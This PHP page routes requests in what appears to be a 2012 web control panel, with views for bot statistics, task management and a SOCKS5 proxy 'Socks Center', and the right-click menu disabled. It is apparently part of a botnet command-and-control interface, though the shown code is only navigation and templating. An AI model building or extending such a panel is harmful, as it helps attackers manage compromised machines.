<?php
	/* Copyright © 2012 by Chrystal */
	
	if(!defined('__CP__')) { die(); }
	
	include_once('templates/frm_dashboard.php');
	include_once('templates/frm_stat_global.php');
	include_once('templates/frm_stat_system.php');
	include_once('templates/frm_management.php');
	include_once('templates/frm_socks5.php');
	include_once('templates/frm_logout.php');
	include_once('templates/mod_commands.php');
	
	$cPage = NULL;
	$rPage = $_GET['q'];
	
	switch($rPage)
	{
		case 'refresh_session':
			$Session->RefreshSession();
			break;
		case 'dashboard':
			$cPage = new Template_Dashboard();
			break;
		case 'stat_global':
			$cPage = new Template_GlobalStatistic();
			break;
		case 'stat_system':
			$cPage = new Template_SystemStatistic();
			break;
		case 'management':
			$cPage = new Template_Management();
			break;
		case 'socks5':
			$cPage = new Template_Socks5();
			break;
		case 'logout';
			$cPage = new Template_Logout();
			break;
		default:
			$cPage = new Template_Dashboard();
			break;
	}
?>

<body oncontextmenu="return false;">
	<div id="page-wrapper">
		<div id="header">
			<a href="javascript:window.location.reload();"><img id="logo" src="resources/images/logo.png" alt="" /></a>
		</div>
		
		<ul id="navigation">
			<li <?php if(!$rPage || $rPage == 'dashboard') { echo 'class="current"'; } ?> ><a href="?q=dashboard">Dashboard</a></li>
			<li <?php if(!strncmp($rPage, 'stat_', 5)) { echo 'class="current"'; } ?> ><a href="" onclick="return false;">Statistic</a>
				<ul>
					<li><a href="?q=stat_global">Global</a></li>
					<li><a href="?q=stat_system">System</a></li>
				</ul>
			</li>
			<li <?php if($rPage == 'management') { echo 'class="current"'; } ?> ><a href="?q=management">Task Management</a></li>
			<li <?php if($rPage == 'socks5') { echo 'class="current"'; } ?> ><a href="?q=socks5">Socks Center</a></li>
			<li <?php if($rPage == 'logout') { echo 'class="current"'; } ?> ><a href="?q=logout">Logout</a></li>
		</ul>
		
		<div id="page">
			<div class="box-header"><?php echo $cPage->GetTitle(); ?></div>
			<div class="box tab-content"><?php echo $cPage->GetContent(); ?></div>
		</div>
		<br class="clear" />
		<div id="footer">Copyright &copy; 2012 by Chrystal</div>
	</div>
</body>